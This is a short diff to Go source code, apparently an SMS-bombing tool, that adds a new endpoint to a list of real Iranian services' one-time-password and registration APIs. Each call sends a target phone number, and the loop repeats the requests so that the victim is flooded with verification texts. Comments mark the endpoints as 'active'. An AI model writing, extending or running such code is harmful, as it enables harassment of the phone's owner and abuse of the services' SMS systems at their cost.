@@ -244,7 +244,9 @@ func main() {
 		go sms("https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)  // active ✅
-
+		go sms("https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{
+			"cellNumber": phone,
+		}, ch)  // active ✅
 
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
